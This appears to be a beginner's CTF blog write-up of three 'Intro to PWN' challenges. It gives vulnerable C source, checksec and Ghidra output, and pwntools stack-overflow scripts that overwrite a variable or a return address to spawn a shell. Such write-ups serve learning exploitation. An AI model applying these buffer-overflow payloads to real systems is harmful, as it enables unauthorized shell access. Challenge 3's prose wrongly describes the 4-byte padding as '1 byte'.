---
layout: post
current: post
cover:  assets/bluehens/introtopwn/cover.png
navigation: True
title: "Intro to PWN 1-3"
date: 2022-11-04 10:00:00
tags: [BlueHensCTF, pwn]
class: post-template
subclass: 'post'
author: squ1rrel
---

This was my first time doing a CTF, so I literally had no idea what was going on the whole time. But I do think I learned a good bit from just observing the CTF, so maybe I can at least get an A for effort.

All of these solutions sorta came from Akash, but I did have to put in a bit of effort to recreate them myself. Hopefully I can actually contribute next time :)

## Intro to PWN 1

These challenges were very beginner friendly, and were meant to serve as an introduction to doing pwn challenges. For the first one, we are provided with a binary executable `pwnme` and the corresponding C code (copied here for ease):

```c
#include <stdio.h> 
#include <stdlib.h> 

int main() {
    char buf[0x100]; 
    int overwrite_me; 
    overwrite_me = 1234; 
    puts("Welcome to PWN 101, smash my variable please.\n"); 
    gets(buf); 
    if (overwrite_me == 0x1337) {
        system("/bin/sh"); 
    } 
    return 0; 
} 
```

Running `checksec pwnme` we get the following output:

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

Since there is no stack canary, we simply need to smash the variable `overwrite_me` with some simple stack BOF.

Decompiling `pwnme` with Ghidra, I got the following output:

```c++
undefined8 main(void) {
    char local_118 [268];
    int local_c;

    local_c = 0x4d2;
    puts("Welcome to PWN 101, smash my variable please.\n");
    gets(local_118);
    if (local_c == 0x1337) {
        system("/bin/sh");
    }
    return 0;
}
```

Doing some reading, I found out that apparently the Ghidra variable names indicate stack frame offset (which makes this so so much easier). That is, `local_118` is `0x118` bytes offset from the stack frame pointer, and similarly `local_c` is `0xc` offset. Thus, since the decompiled code indicates that the `gets` will put stuff into `local_118`, we just need to write `0x118 - 0xc` bytes of junk and then write `0x1337` and we should get shell access. 

Thus, the exploit is as follows:

```py
from pwn import *

binary = context.binary = ELF('./pwnme')

p = process(binary.path)
payload = b''
payload += (0x118 - 0xc) * b'A'
payload += p32(0x1337)

p.sendlineafter("Welcome to PWN 101, smash my variable please.\n", payload)
p.interactive()
```
At this point we get shell access and we can just run `cat flag.txt` to get the flag. Yay! On to the next one!

## Intro to PWN 2

Similar setup to last time, except we have a new executable made from the following C code:
```c
#include <stdlib.h> 
#include <stdio.h> 

void win() { 
    system("/bin/sh"); 
}

void vuln() {
    char buf[55]; 
    gets(buf); 
}

int main() { 
    puts("Level 2: Control the IP\n"); 
    vuln(); 
    return 0; 
} 
```

Running `checksec` on this new executable, we get:
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

And just to get it out of the way, here's the decompiled version from Ghidra:
```c++
void win(void) {
    system("/bin/sh");
    return;
}

void vuln(void) {
    char local_43 [59];

    gets(local_43);
    return;
}

undefined4 main(void) {
  undefined *puVar1;
  
  puVar1 = &stack0x00000004;
  puts("Level 2: Control the IP\n");
  vuln(puVar1);
  return 0;
}
```

So basically what we need to do here is from the `gets` call in `vuln()`, we want to overwrite the return address to go to `win()`, at which point we would get shell access. Using the naming conventions given by Ghidra, since we are storing the input we send the program in `local_43`, we can overwrite the return address by writing `0x43` bytes of junk and then writing the address of `win()`. And conveniently for us, we can easily get the return address for `win()` using pwntools, giving us the following exploit:

```py
from pwn import *

binary = context.binary = ELF('./pwnme')

p = process(binary.path)
payload = b''
payload += 0x43 * b'A'
payload += p32(binary.sym.win)

p.sendlineafter("Level 2: Control the IP\n", payload)
p.interactive()
```
Great! Just as before, the preceding code gets us shell access and getting the flag is now a piece of cake. Ok, let's do one last one!

## Intro to PWN 3

This one is similar to the previous one:

```c++
#include <stdlib.h> 
#include <stdio.h> 

void win(unsigned int x) { 
    if (x != 0xdeadbeef) {
        puts("Almost...");
	    return;
    }

    system("/bin/sh");
} 

void vuln() {
    char buf[24]; 
    gets(buf); 
} 

int main() { 
    puts("Level 3: Args too?\n"); 
    vuln();
    return 0;
} 
```

Here's the `checksec` (same as the last one):
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

And here's Ghidra:
```c++
void win(int param_1) {
    if (param_1 == -0x21524111) {
        system("/bin/sh");
    } else {
        puts("Almost...");
    }

    return;
}

void vuln(void) {
    char local_24 [28];

    gets(local_24);
    return;
}

undefined4 main(void) {
    undefined *puVar1;

    puVar1 = &stack0x00000004;
    puts("Level 3: Args too?\n");
    vuln(puVar1);
    return 0;
}
```

The exploit this time is the same as before: we just need to ensure the parameter that is passed to `win()` is `0xdeadbeef`. Since we are writing to `local_24`, we simply write `0x24` bytes of junk, and then the address to `win()`, and then to pass an argument, we write 1 byte of junk and then the value we want the argument to take. Putting that all together, we get:
```py
from pwn import *

binary = context.binary = ELF('./pwnme')

p = process(binary.path)
payload = b''
payload += 0x24 * b'A'
payload += p32(binary.sym.win)
payload += p32(0)
payload += p32(0xdeadbeef)

p.sendlineafter("Level 3: Args too?\n", payload)
p.interactive()
```
Woo! We did it! At this point, I don't fully know how to do the rest of the challenges, so this is where I tap out. Thanks for reading along!

## Reflections

I really liked that these first few challenges were so beginner-friendly given that this was my first exposure to a CTF. I feel like I have a basic understanding of how to use PWN, though there is certainly a lot more for me to learn. Thanks for following along and I hope this post was at least a bit insightful to anyone reading!